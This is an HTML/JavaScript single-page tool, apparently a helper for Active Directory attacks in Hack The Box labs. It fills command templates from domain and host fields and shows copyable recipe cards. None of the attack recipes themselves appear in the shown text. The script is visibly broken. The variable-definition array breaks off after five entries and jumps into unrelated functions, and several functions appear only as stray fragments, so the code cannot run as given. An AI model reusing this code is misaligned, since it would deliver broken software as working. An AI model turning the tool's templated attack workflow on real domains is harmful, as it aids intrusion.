<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Hackerman v1.7.0 — AD Attack Helper (Kali · HTB)</title>
<style>
:root{
  --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
  --txt:#dbe4f3; --dim:#7c8db0; --accent:#22d3ee; --accent2:#38bdf8;
  --ok:#34d399; --warn:#fbbf24; --bad:#f87171;
  --v-domain:#22d3ee; --v-host:#facc15; --v-ip:#fb923c; --v-user:#4ade80;
  --v-secret:#f87171; --v-hash:#e879f9; --v-key:#c084fc; --v-spn:#60a5fa;
  --v-file:#a78bfa; --v-num:#fda4af; --v-flag:#94a3b8; --v-sid:#a5b4fc;
  --mono:ui-monospace,SFMono-Regular,"JetBrains Mono","Fira Code",Menlo,Consolas,monospace;
  --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{background:var(--bg);color:var(--txt);font-family:var(--sans);font-size:14px;line-height:1.45}
a{color:var(--accent2)}
.dim{color:var(--dim)}
.mono{font-family:var(--mono)}

header{position:sticky;top:0;z-index:50;background:linear-gradient(180deg,#0c1424 0%,#0c1424f2 100%);border-bottom:1px solid var(--line);backdrop-filter:blur(6px)}
.hwrap{display:flex;align-items:center;gap:14px;flex-wrap:wrap;padding:9px 16px}
.brand{font-weight:700;letter-spacing:.3px;white-space:nowrap}
.brand b{color:var(--accent)}
.hactions{margin-left:auto;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
button,select,input,textarea{font-family:inherit;font-size:13px;color:var(--txt);background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:5px 9px}
button{cursor:pointer}
button:hover{border-color:var(--accent);color:#fff}
button.primary{background:#0e7490;border-color:#155e75;color:#fff}
button.ghost{background:transparent}
label.proxy{display:flex;align-items:center;gap:6px;background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:5px 9px;cursor:pointer;user-select:none}
label.proxy input{accent-color:var(--accent)}
label.proxy.on{border-color:var(--accent);color:#fff}

#ctx{border-bottom:1px solid var(--line);background:var(--panel)}
.ctx-head{display:flex;align-items:center;gap:10px;padding:6px 16px;cursor:pointer;user-select:none}
.ctx-head .title{font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
.ctx-head .chev{margin-left:auto;transition:transform .15s}
#ctx.closed .chev{transform:rotate(-90deg)}
.ctx-body{padding:4px 16px 14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px 18px}
#ctx.closed .ctx-body{display:none}
.ctx-group{display:flex;flex-direction:column;gap:6px;min-width:0}
.ctx-group>.gname{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--dim);border-bottom:1px dashed var(--line);padding-bottom:3px}
.field{display:flex;align-items:center;gap:8px}
.field label{flex:0 0 96px;text-align:right;font-size:12px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.field input{flex:1;min-width:0;font-family:var(--mono);font-size:12.5px}
.field input.derived{color:#7dd3fc;background:#0a1322;border-style:dashed;border-color:#2a3f63;cursor:copy}
.field input.req-missing{border-left:3px solid var(--warn)}
.field input.src-hl{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}
.field label .lauto{display:inline-block;margin-left:5px;font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:#7dd3fc;border:1px solid #164e63;border-radius:4px;padding:0 4px;vertical-align:1px}
@keyframes fieldflash{0%,100%{box-shadow:0 0 0 0 transparent}50%{box-shadow:0 0 0 2px var(--warn)}}
.field input.field-flash{animation:fieldflash .45s 3}
.field input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}
.ctx-summary{font-size:12px;color:var(--dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:50vw}

nav.tabs{position:sticky;top:var(--headerH,45px);z-index:40;display:flex;gap:2px;padding:0 16px;background:#0c1424;border-bottom:1px solid var(--line)}
nav.tabs button{background:transparent;border:none;border-bottom:2px solid transparent;border-radius:0;padding:10px 14px;color:var(--dim);font-weight:600}
nav.tabs button.active{color:#fff;border-bottom-color:var(--accent)}
nav.tabs button:hover{color:#fff}
main{padding:16px;max-width:1500px;margin:0 auto}
.tab{display:none}
.tab.active{display:block}

.toolbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:14px;position:sticky;top:calc(var(--headerH,45px) + var(--tabsH,43px));z-index:30;background:var(--bg);padding:8px 0}
#search{flex:0 0 330px;font-family:var(--mono)}
.chips{display:flex;gap:5px;flex-wrap:wrap}
.chip{font-size:12px;padding:3px 9px;border-radius:999px;border:1px solid var(--line);background:var(--panel2);cursor:pointer;color:var(--dim)}
.chip:hover{color:#fff;border-color:var(--accent)}
.chip.on{background:#0e7490;border-color:#155e75;color:#fff}

.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(420px,1fr));gap:14px}
.recipe{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px 13px;display:flex;flex-direction:column;gap:8px;min-width:0;cursor:pointer}
.recipe:hover{border-color:#2a4a75}
.recipe.collapsed{padding:9px 12px;gap:5px}
.recipe.collapsed .desc{display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;margin:0}
.focusmark{color:var(--dim);font-size:12px;padding:0 4px;opacity:.6}
.recipe:hover .focusmark{color:var(--accent);opacity:1}
#focusOverlay{position:fixed;inset:0;background:#000a;z-index:120;display:flex;align-items:center;justify-content:center;padding:24px}
#focusOverlay.hidden{display:none}
#focusBox{position:relative;background:var(--panel);border:1px solid #2a3f63;border-radius:12px;width:min(980px,94vw);max-height:88vh;overflow:auto;padding:16px 18px;box-shadow:0 20px 60px #000c;z-index:130}
#focusBox:focus{outline:none}
#focusClose{position:absolute;top:8px;right:10px;font-size:18px;line-height:1;padding:3px 9px;background:transparent;border:1px solid var(--line);border-radius:7px;color:var(--dim);cursor:pointer;z-index:2}
#focusClose:hover{color:#fff;border-color:var(--accent)}
#focusBody .recipe{border:none;background:transparent;padding:0;cursor:default}
#focusBody .recipe:hover{border:none}
body.focus-open{overflow:hidden}
.recipe.incomplete{border-color:#7f1d1d}
.rc-head{display:flex;flex-direction:column;gap:6px}
.rc-title{display:flex;align-items:flex-start;gap:8px}
.rc-title h3{margin:0;font-size:15px;line-height:1.3;flex:1}
.rc-meta{display:flex;align-items:center;gap:7px;flex-wrap:wrap}
.rc-meta .copy{position:static;margin-left:auto}
.cat{font-size:10.5px;text-transform:uppercase;letter-spacing:.08em;padding:2px 7px;border-radius:5px;background:#0e2a3a;color:var(--accent);border:1px solid #164e63;white-space:nowrap}
.tier{font-size:10.5px;text-transform:uppercase;letter-spacing:.08em;padding:2px 7px;border-radius:5px;white-space:nowrap;border:1px solid}
.tier.t4{color:#34d399;border-color:#166534;background:#0b2318}
.tier.t3{color:#22d3ee;border-color:#164e63;background:#0e2a3a}
.tier.t2{color:#fbbf24;border-color:#78350f;background:#251a07}
.tier.t1{color:#94a3b8;border-color:#334155;background:#151c2b}
.chip.t4{color:#34d399}
.chip.t3{color:#22d3ee}
.chip.t2{color:#fbbf24}
.chip.t1{color:#94a3b8}
.chip.t4.on{background:#0b2318;border-color:#166534;color:#34d399}
.chip.t3.on{background:#0e2a3a;border-color:#164e63;color:#22d3ee}
.chip.t2.on{background:#251a07;border-color:#78350f;color:#fbbf24}
.chip.t1.on{background:#151c2b;border-color:#334155;color:#94a3b8}
.reqchip{font-size:10.5px;padding:2px 7px;border-radius:5px;border:1px solid #7c4a03;background:#2a1c05;color:#fbbf24;white-space:nowrap}
.reqrow{display:flex;align-items:center;gap:6px;flex-wrap:wrap;font-size:11.5px}
.badge.reqmore{color:#fbbf24}
.stepreq{font-size:11.5px;color:#fbbf24;margin:0 0 8px}
.prereqbox{background:#1c1508;border:1px solid #7c4a03;border-radius:8px;padding:7px 10px;font-size:12.3px;color:#e8d9b8;margin:0 0 12px}
.prereqbox b{color:#fbbf24}
.flowreqs{font-size:11.5px;color:#fbbf24;margin:0}
#tierFilter .chip:not(.on){text-decoration:line-through;opacity:.6}
.desc{color:var(--dim);font-size:12.5px;margin:0}
.badge{font-size:11px;color:var(--warn)}
.badge.miss{color:var(--bad);cursor:pointer}
.badge.req{color:var(--warn);cursor:pointer}
.badge.req.ok{color:var(--ok);cursor:default}
.cmd{position:relative;background:#070c16;border:1px solid var(--line);border-radius:8px;padding:8px 40px 8px 10px;overflow-x:auto}
.cmd .clabel{font-size:11px;color:var(--dim);margin-bottom:4px}
.cmd pre{margin:0;font-family:var(--mono);font-size:12.8px;white-space:pre-wrap;word-break:break-word}
.cmd.ready{background:#0e1a2e;border-color:#1e3a5f;box-shadow:inset 3px 0 0 var(--ok)}
.cmd.ready .clabel::after{content:" · ready";color:var(--ok)}
.recipe.ready{background:#111c31;border-color:#1d3557}
.recipe.ready-all{box-shadow:inset 3px 0 0 var(--ok)}
.badge.ready{color:var(--ok)}
.flow.ready{border-color:#2f6f5e;background:#0f1c2c;box-shadow:inset 3px 0 0 var(--ok)}
.copy{position:absolute;top:6px;right:6px;padding:2px 8px;font-size:11px;background:#132038;border-color:#24334f;color:var(--dim)}
.copy:hover{color:#fff}
.copy.done{color:var(--ok);border-color:var(--ok)}
.note{font-size:12.3px;color:#a8b8d8;background:#0d1a2e;border-left:3px solid var(--accent2);border-radius:0 7px 7px 0;padding:7px 10px}
.note b{color:var(--accent2)}
.v-domain{color:var(--v-domain)} .v-host{color:var(--v-host)} .v-ip{color:var(--v-ip)}
.v-user{color:var(--v-user)} .v-secret{color:var(--v-secret)} .v-hash{color:var(--v-hash)}
.v-key{color:var(--v-key)} .v-spn{color:var(--v-spn)} .v-file{color:var(--v-file)}
.v-num{color:var(--v-num)} .v-flag{color:var(--v-flag)} .v-sid{color:var(--v-sid)}
.v-proxy{color:#f472b6;font-weight:600}
.v-miss{color:#fca5a5;background:#3b0d0d;border-radius:3px;padding:0 3px;border-bottom:1px dashed #fca5a5;cursor:pointer}
.v-miss:hover{background:#5b1414;color:#fff}
[data-edit]{cursor:pointer}
[data-edit]:hover{background:rgba(34,211,238,.14);border-radius:3px}
#missPop{position:fixed;z-index:310;display:none;width:340px;background:#0d1626;border:1px solid #2a3f63;border-radius:9px;padding:10px 11px;box-shadow:0 10px 30px #000b}
#missPop .mp-title{font-size:12.5px;margin-bottom:7px;color:#dbe4f3}
#missPop .mp-title b{color:var(--accent2)}
#missPop input{width:100%;font-family:var(--mono);font-size:12.5px;margin-bottom:8px}
#missPop .mp-actions{display:flex;gap:6px;align-items:center}
#missPop .mp-actions button{font-size:12px;padding:4px 10px}
#missPop .spacer{flex:1}

.flows{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:14px}
.flow{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px;cursor:pointer;display:flex;flex-direction:column;gap:7px;transition:border-color .15s,transform .1s}
.flow:hover{border-color:var(--accent);transform:translateY(-1px)}
.flow h3{margin:0;font-size:15px}
.flow p{margin:0;color:var(--dim);font-size:12.5px}
.flow .meta{font-size:11.5px;color:var(--dim);display:flex;align-items:center;gap:8px}
.pbar{height:5px;background:#0a1424;border-radius:999px;overflow:hidden;border:1px solid var(--line)}
.pbar>i{display:block;height:100%;background:linear-gradient(90deg,#0891b2,#22d3ee);width:0}
.back{background:transparent;border:none;color:var(--accent2);padding:0;margin-bottom:10px;font-size:13px}
.flowhead{margin-bottom:14px}
.flowhead h2{margin:0 0 4px;font-size:19px}
.flowhead p{margin:0 0 10px;color:var(--dim)}
.step{border-left:2px solid var(--line);padding:0 0 16px 16px;position:relative;margin-left:6px}
.step::before{content:"";position:absolute;left:-7px;top:4px;width:12px;height:12px;border-radius:50%;background:var(--panel2);border:2px solid var(--line)}
.step.done::before{background:var(--ok);border-color:var(--ok)}
.step-head{display:flex;align-items:center;gap:10px;margin-bottom:9px}
.step-head h3{margin:0;font-size:15px;flex:1}
.step-head input{accent-color:var(--ok);width:16px;height:16px;cursor:pointer}
.step .stip{color:var(--dim);font-size:12.5px;margin:0 0 10px}
.step .grid{grid-template-columns:1fr}

.tbl{width:100%;border-collapse:collapse}
.tbl td,.tbl th{border-bottom:1px solid var(--line);padding:7px 9px;text-align:left;vertical-align:top;font-size:13px}
.tbl th{color:var(--dim);font-weight:600;font-size:11.5px;text-transform:uppercase;letter-spacing:.08em}
.swatch{display:inline-block;width:10px;height:10px;border-radius:3px;margin-right:7px;vertical-align:middle}
h2.sec{font-size:17px;margin:26px 0 12px;border-bottom:1px solid var(--line);padding-bottom:7px}
h2.sec:first-child{margin-top:4px}

.cyber{background:var(--panel);border:1px solid var(--line);border-radius:9px;padding:10px 12px;margin-bottom:10px}
.cyber h4{margin:0 0 4px;font-size:13.5px}
.cyber .cmd{margin-top:7px}

.modal{position:fixed;inset:0;background:#000a;display:flex;align-items:center;justify-content:center;z-index:100}
.modal.hidden{display:none}
.modal-box{background:var(--panel);border:1px solid var(--line);border-radius:12px;width:min(720px,92vw);padding:16px;display:flex;flex-direction:column;gap:10px}
.modal-box h3{margin:0}
.modal-box textarea{height:300px;font-family:var(--mono);font-size:12px;resize:vertical}
.modal-actions{display:flex;gap:8px;justify-content:flex-end}
#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:#0e7490;color:#fff;padding:8px 18px;border-radius:999px;font-weight:600;transition:transform .2s;z-index:200;box-shadow:0 6px 20px #0008}
#tip{position:fixed;z-index:300;display:none;max-width:420px;background:#0d1626;border:1px solid #2a3f63;border-radius:9px;padding:9px 11px;font-size:12.5px;line-height:1.5;color:#dbe4f3;box-shadow:0 10px 30px #000b}
#tip b{color:var(--accent2)}
.hastip{cursor:help}
h3.hastip{border-bottom:1px dotted #3b5a89}
.cmd.hastip .clabel{display:inline-block;border-bottom:1px dotted #3b5a89}
.infoq{display:inline-block;margin-left:6px;width:14px;height:14px;line-height:13px;text-align:center;font-size:10px;border-radius:50%;border:1px solid #334155;color:var(--dim);vertical-align:1px}
.hastip:hover .infoq,.hastip:focus .infoq{color:var(--accent);border-color:var(--accent)}
body.nohelp .infoq{display:none}
body.nohelp .hastip{cursor:inherit}
body.nohelp h3.hastip{border-bottom:none}
body.nohelp .cmd.hastip .clabel{border-bottom:none}
#toast.show{transform:translateX(-50%) translateY(0)}
footer{color:var(--dim);text-align:center;padding:26px 16px;font-size:12px}
kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2px;border-radius:4px;padding:0 5px;font-family:var(--mono);font-size:11.5px}
@media (max-width:760px){
  .ctx-body{grid-template-columns:1fr}
  .field label{flex-basis:80px}
  #search{flex:1 1 100%}
}
</style>
</head>
<body>

<header>
  <div class="hwrap">
    <div class="brand">Hackerman <b>v1.7.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
    <div class="hactions">
      <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
      <button id="presetSave" title="Save current context as preset">Save</button>
      <button id="presetDel" class="ghost" title="Delete selected preset">Del</button>
      <button id="exampleBtn" class="ghost" title="fill context with the argon.htb example from the writeup notes">example</button>
      <button id="zshBtn" class="ghost" title="export zsh completions (_hackerman)">zsh</button>
      <button id="expBtn" class="ghost" title="Export context as JSON">Export</button>
      <button id="impBtn" class="ghost" title="Import context JSON">Import</button>
      <button id="resetBtn" class="ghost" title="Reset context">Reset</button>
      <label class="proxy" id="proxyLbl"><input type="checkbox" id="proxyChk"> proxychains</label>
    </div>
  </div>
</header>

<section id="ctx">
  <div class="ctx-head" id="ctxToggle">
    <span class="title">Context</span>
    <span id="reqCount" class="badge"></span>
    <span class="ctx-summary mono" id="ctxSummary"></span>
    <span class="chev">▾</span>
  </div>
  <div class="ctx-body" id="ctxBody"></div>
</section>

<nav class="tabs" id="tabs">
  <button data-tab="wizard" class="active">Wizard</button>
  <button data-tab="recipes">Recipes</button>
  <button data-tab="bh">BloodHound</button>
  <button data-tab="legend">Legend</button>
</nav>

<main>
  <section id="tab-wizard" class="tab active"></section>
  <section id="tab-recipes" class="tab">
    <div class="toolbar">
      <input id="search" placeholder="search recipes / commands…   [/]">
      <select id="sortSel" title="sort recipes">
        <option value="priority">sort: priority → ready</option>
        <option value="ready">sort: ready → priority</option>
        <option value="data">sort: data order</option>
      </select>
      <button class="chip" id="readyOnlyChip" title="only show recipes with at least one runnable command">ready only</button>
      <button class="chip" id="helpChip" title="hover explanations on/off">help</button>
      <button class="chip" id="compactChip" title="collapse recipe cards (click a card to open the focus popup)">compact</button>
      <span id="readyCount" class="dim mono" style="font-size:12px"></span>
      <div class="chips" id="catFilter"></div>
      <div class="chips" id="tierFilter"></div>
    </div>
    <div class="grid" id="recipeList"></div>
  </section>
  <section id="tab-bh" class="tab"></section>
  <section id="tab-legend" class="tab"></section>
</main>

<footer class="mono">Hackerman v1.7.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>

<div id="focusOverlay" class="hidden">
  <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
    <button id="focusClose" title="close (Esc)">×</button>
    <div id="focusBody"></div>
  </div>
</div>

<div id="modal" class="modal hidden">
  <div class="modal-box">
    <h3 id="modalTitle"></h3>
    <textarea id="modalText" spellcheck="false"></textarea>
    <div class="modal-actions">
      <button id="modalDownload" class="ghost">Download</button>
      <button id="modalCopy" class="ghost">Copy</button>
      <button id="modalApply" class="primary">Apply</button>
      <button id="modalClose">Close</button>
    </div>
  </div>
</div>
<div id="toast"></div>
<div id="tip"></div>
<div id="missPop">
  <div class="mp-title" id="missPopTitle"></div>
  <input id="missPopInput" type="text" autocomplete="off" spellcheck="false">
  <div class="mp-actions">
    <button id="missPopSave" class="primary">save</button>
    <button id="missPopCtx" class="ghost">context</button>
    <span class="spacer"></span>
    <button id="missPopCancel" class="ghost">cancel</button>
  </div>
</div>

<script>
'use strict';

/* ============================== state ============================== */
const LS_STATE = 'adah.state.v1', LS_PROG = 'adah.progress.v1', LS_PRESETS = 'adah.presets.v1';

const VAR_DEFS = [
  {k:'domain',      label:'Domain FQDN',   ph:'argon.htb',                 grp:'Domain / DC', color:'v-domain', req:1},
  {k:'netbios',     label:'NetBIOS',       ph:'ARGON',                     grp:'Domain / DC', color:'v-domain'},
  {k:'realm',       label:'Realm',         ph:'ARGON.HTB',                 grp:'Domain / DC', color:'v-domain', derive:s=>(s.domain||'').toUpperCase(), src:['domain'], hint:'domain → UPPERCASE'},
  {k:'domain_dn',   label:'Domain DN',     ph:'DC=ARGON,DC=HTB',           grp:'Domain / DC', color:'v-host', derive:s=>s.domain?('DC='+s.domain.split('.').join(',DC=')):'', src:['domain'], hint:"'DC=' + domain parts"},
  {k:'dc_host',     label:'DC host',       ph:'prod-dc',                   grp:'Domain / DC', color:'v-host', req:1},

const $ = s => document.querySelector(s);
const $$ = s => Array.from(document.querySelectorAll(s));
const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

function val(k){
  const d = VAR_DEFS.find(v => v.k === k);
  if(!d) return '';
  let v = (S[k] == null ? '' : String(S[k])).trim();
  if(!v && d.derive) v = d.derive(S) || '';
  return v;
}

function proxyOn(){ return !!S.proxy; }

function renderCommand(c){
  let tpl, label = '', flags = '';
  if(Array.isArray(c)){ tpl = c[0]; label = c[1] || ''; flags = c[2] || ''; }
  else { tpl = c; }
  const parts = [], miss = [], missK = [];
  const re = /\{\{(\w+)\}\}/g;
  let last = 0, m;
  while((m = re.exec(tpl))){
    if(m.index > last) parts.push({t:tpl.slice(last, m.index)});
    const d = VAR_DEFS.find(v => v.k === m[1]);
    const v = val(m[1]);
    if(v) parts.push({t:v, c:d ? d.color : '', k:m[1], edit:true, lbl:(d ? d.label : m[1]), derived:!!(d && d.derive), hint:(d && d.hint) || ''});
    else { const lbl = d ? d.label : m[1]; miss.push(lbl); if(missK.indexOf(m[1]) < 0) missK.push(m[1]); parts.push({t:'‹' + lbl + '?›', c:'v-miss', k:m[1], miss:true, lbl:lbl}); }
    last = re.lastIndex;
  }
  if(last < tpl.length) parts.push({t:tpl.slice(last)});
  const pre = [];
  if(flags.indexOf('s') >= 0) pre.push({t:'sudo ', c:'v-flag'});
  if(proxyOn() && flags.indexOf('n') < 0) pre.push({t:'proxychains ', c:'v-proxy'});
  const html = pre.concat(parts).map(p => {
    if(!p.c && !p.miss && !p.edit) return esc(p.t);
    let attrs = '';
    if(p.miss){
      attrs = ' data-miss="' + p.k + '" title="click to set ' + esc(p.lbl) + '"';
    } else if(p.edit){
      attrs = p.derived
        ? ' data-edit="' + p.k + '" title="computed (' + esc(p.hint) + ') — click to jump to the source fields"'
        : ' data-edit="' + p.k + '" title="click to change ' + esc(p.lbl) + '"';
    }
    return '<span class="' + (p.c || '') + '"' + attrs + '>' + esc(p.t) + '</span>';
  }).join('');
  const text = pre.map(p => p.t).join('') + parts.map(p => p.t).join('');
  return {html, text, label, miss, missK, ready: miss.length === 0, tip: HELP_TOOL[toolKey(tpl)] || ''};
}

function copyText(t){
  if(navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(t).then(() => toast('copied'), () => fallbackCopy(t));
  } else fallbackCopy(t);
}
function fallbackCopy(t){
  const ta = document.createElement('textarea');
  ta.value = t; ta.style.position = 'fixed'; ta.style.opacity = '0';
  document.body.appendChild(ta); ta.select();
  try { document.execCommand('copy'); toast('copied'); } catch(e){ toast('copy failed'); }
  document.body.removeChild(ta);
}
let toastT;
function toast(msg){
  const el = $('#toast'); el.textContent = msg; el.classList.add('show');
  clearTimeout(toastT); toastT = setTimeout(() => el.classList.remove('show'), 1400);
}

function mkCopyBtn(text, cls){
  const b = document.createElement('button');
  b.className = 'copy' + (cls ? ' ' + cls : '');
  b.textContent = 'copy';
  b.addEventListener('click', () => {
    copyText(text);
    b.classList.add('done'); b.textContent = '✓';
    setTimeout(() => { b.classList.remove('done'); b.textContent = 'copy'; }, 1200);
  });
  return b;
}

function tipTarget(e){ return e.target && e.target.closest ? e.target.closest('[data-tip]') : null; }
function showTip(el){
  if(!UI.help || !el) return;
  const tip = $('#tip');
  const txt = el.getAttribute('data-tip');
  if(!txt) return;
  tip.innerHTML = txt;
  tip.style.display = 'block';
  const r = el.getBoundingClientRect();
  const tw = tip.offsetWidth, th = tip.offsetHeight;
  const left = Math.min(Math.max(8, r.left), Math.max(8, window.innerWidth - tw - 8));
  let top = r.bottom + 8;
  if(top + th > window.innerHeight - 8) top = r.top - th - 8;
  tip.style.left = left + 'px';
  tip.style.top = Math.max(8, top) + 'px';
}
function hideTip(){ const tip = $('#tip'); if(tip) tip.style.display = 'none'; }
function initTip(){
  document.addEventListener('mouseover', e => { const t = tipTarget(e); if(t) showTip(t); });
  document.addEventListener('mouseout', e => {
    const t = tipTarget(e);
    if(!t) return;
    if(e.relatedTarget && t.contains(e.relatedTarget)) return;
    hideTip();
  });
  document.addEventListener('focusin', e => { const t = tipTarget(e); if(t) showTip(t); });
  document.addEventListener('focusout', hideTip);
  window.addEventListener('scroll', hideTip, true);
  document.addEventListener('keydown', e => { if(e.key === 'Escape'){ hideTip(); closeMissPop(); } });
}

function initMissPop(){

      const key = m.getAttribute('data-miss') || m.getAttribute('data-edit');
      openMissPop(m, key, m.hasAttribute('data-edit') ? 'change' : 'set');

    if(!e.target.closest || !e.target.closest('#missPop')) closeMissPop();
  });
  $('#missPopSave').addEventListener('click', saveMissPop);

    if(e.key === 'Enter'){ e.preventDefault(); saveMissPop(); }

}

function renderNote(html){
  return String(html).replace(/\{\{(\w+)\}\}/g, (m, k) => {
    const d = VAR_DEFS.find(v => v.k === k);
    const v = val(k);
    if(v){
      const lbl = d ? d.label : k;
      const attrs = d && d.derive
        ? ' data-edit="' + k + '" title="computed (' + esc(d.hint || '') + ') — click to jump to the source fields"'
        : ' data-edit="' + k + '" title="click to change ' + esc(lbl) + '"';
      return '<span class="' + (d ? d.color : '') + '"' + attrs + '>' + esc(v) + '</span>';
    }
    return '<span class="v-miss" data-miss="' + k + '" title="click to set ' + esc(d ? d.label : k) + '">‹' + (d ? d.label : k) + '?›</span>';
  });
}

function recipeCard(r, alwaysExpanded){
  const card = document.createElement('div');
  card.className = 'recipe';
  card.dataset.recipeId = r.id;
  const collapsed = UI.compact && !alwaysExpanded;
  if(collapsed) card.classList.add('collapsed');
  const rendered = r.cmds.map(renderCommand);
  const readyCount = rendered.filter(x => x.ready).length;
  const misses = [];
  rendered.forEach(x => x.miss.forEach(l => { if(misses.indexOf(l) < 0) misses.push(l); }));
  const missKeys = [];
  rendered.forEach(x => x.missK.forEach(k => { if(missKeys.indexOf(k) < 0) missKeys.push(k); }));
  if(readyCount) card.classList.add('ready');
  if(readyCount === rendered.length) card.classList.add('ready-all');
  if(!readyCount) card.classList.add('incomplete');

  const head = document.createElement('div');
  head.className = 'rc-head';
  const cat = document.createElement('span');
  cat.className = 'cat';
  const c = CATS.find(x => x.id === r.cat);
  cat.textContent = c ? c.name : r.cat;
  const h3 = document.createElement('h3');
  h3.innerHTML = esc(r.title);
  if(r.info){
    h3.classList.add('hastip'); h3.dataset.tip = r.info; h3.tabIndex = 0;
    h3.title = '';
    const q = document.createElement('span'); q.className = 'infoq'; q.textContent = '?';
    h3.appendChild(q);
  }
  const tier = document.createElement('span');
  tier.className = 'tier t' + (r.pri || 2);
  tier.title = 'applicability: ' + (TIERS[r.pri] ? TIERS[r.pri].name + ' — ' + TIERS[r.pri].tip : TIERS[2].name);
  tier.textContent = TIERS[r.pri] ? TIERS[r.pri].name : TIERS[2].name;
  const fm = document.createElement('span');
  fm.className = 'focusmark'; fm.title = collapsed ? 'click to expand' : 'click the card to focus'; fm.textContent = '⤢';
  const all = rendered.map(x => x.text).join('\n');
  const titleRow = document.createElement('div');
  titleRow.className = 'rc-title';
  titleRow.appendChild(h3);
  const metaRow = document.createElement('div');
  metaRow.className = 'rc-meta';
  metaRow.appendChild(cat); metaRow.appendChild(tier);
  const reqs = reqSorted(r.reqs);
  reqs.slice(0, 2).forEach(t => metaRow.appendChild(reqChip(t, false)));
  if(reqs.length > 2){
    const n = document.createElement('span');
    n.className = 'badge reqmore';
    n.title = reqs.slice(2).map(t => REQ_DEFS[t].label + ': ' + REQ_DEFS[t].tip).join(' | ');
    n.textContent = '+' + (reqs.length - 2);
    metaRow.appendChild(n);
  }
  if(readyCount){
    const rb = document.createElement('span');
    rb.className = 'badge ready'; rb.title = 'commands runnable with the current context';
    rb.textContent = 'ready ' + readyCount + '/' + rendered.length;
    metaRow.appendChild(rb);
  }
  if(misses.length){
    const b = document.createElement('span');
    b.className = 'badge miss'; b.title = 'click to jump to the missing context fields';
    b.textContent = 'missing: ' + misses.join(', ');
    b.addEventListener('click', e => { e.stopPropagation(); focusContextFields(missKeys); });
    metaRow.appendChild(b);
  }
  metaRow.appendChild(fm);
  metaRow.appendChild(mkCopyBtn(all));
  head.appendChild(titleRow); head.appendChild(metaRow);
  card.appendChild(head);

  if(r.desc){
    const p = document.createElement('p');
    p.className = 'desc';
    p.textContent = r.desc;
    card.appendChild(p);
  }
  if(!collapsed && reqs.length){
    const reqRow = document.createElement('div');
    reqRow.className = 'reqrow';
    const rl = document.createElement('span');
    rl.className = 'dim'; rl.textContent = 'requires:';
    reqRow.appendChild(rl);
    reqs.forEach(t => reqRow.appendChild(reqChip(t, false)));
    card.appendChild(reqRow);
  }
  if(!collapsed){
    rendered.forEach((x, i) => {
      const wrap = document.createElement('div');
      wrap.className = 'cmd' + (x.ready ? ' ready' : '');
      if(x.tip){ wrap.classList.add('hastip'); wrap.dataset.tip = x.tip; wrap.tabIndex = 0; }
      if(x.label){
        const l = document.createElement('div');
        l.className = 'clabel';
        l.textContent = x.label;
        if(x.tip){ const q = document.createElement('span'); q.className = 'infoq'; q.textContent = '?'; l.appendChild(q); }
        wrap.appendChild(l);
      } else if(x.tip){
        const q = document.createElement('span'); q.className = 'infoq'; q.textContent = '?';
        wrap.appendChild(q);
      }
      const pre = document.createElement('pre');
      pre.innerHTML = x.html;
      wrap.appendChild(pre);
      wrap.appendChild(mkCopyBtn(x.text));
      card.appendChild(wrap);
    });
    if(r.note){
      const n = document.createElement('div');
      n.className = 'note';
      n.innerHTML = renderNote(r.note);
      card.appendChild(n);
    }
  }
  return card;
}

      l.innerHTML = esc(v.label) + (v.derive ? ' <span class="lauto">auto</span>' : '');
      const i = document.createElement('input');
      i.type = 'text'; i.placeholder = v.ph || ''; i.autocomplete = 'off'; i.spellcheck = false;
      if(v.derive){
        i.readOnly = true; i.classList.add('derived');
        i.title = 'computed: ' + (v.hint || v.label) + ' — change the source fields instead';
      }
      const handler = () => {
        if(v.derive) return;
        S[v.k] = i.value; saveState(); updateSummary(); scheduleRender();
      };
      i.addEventListener('input', handler);
      i.addEventListener('change', handler);
      if(v.derive){
        const glow = on => (v.src || []).forEach(s => { const el = ctxInputs[s]; if(el) el.classList.toggle('src-hl', on); });
        i.addEventListener('mouseenter', () => glow(true));
        i.addEventListener('mouseleave', () => glow(false));
        i.addEventListener('focus', () => glow(true));
        i.addEventListener('blur', () => glow(false));
        i.addEventListener('click', () => i.select());
      }
      f.appendChild(l); f.appendChild(i);
      box.appendChild(f);
      ctxInputs[v.k] = i;
    });
    body.appendChild(box);
  });
  syncContext();
}

function syncContext(){
  VAR_DEFS.forEach(v => { const i = ctxInputs[v.k]; if(i) i.value = val(v.k); });
  const pc = $('#proxyChk');
  pc.checked = proxyOn();
  $('#proxyLbl').classList.toggle('on', proxyOn());
  const missing = VAR_DEFS.filter(v => v.req && !val(v.k)).map(v => v.k);
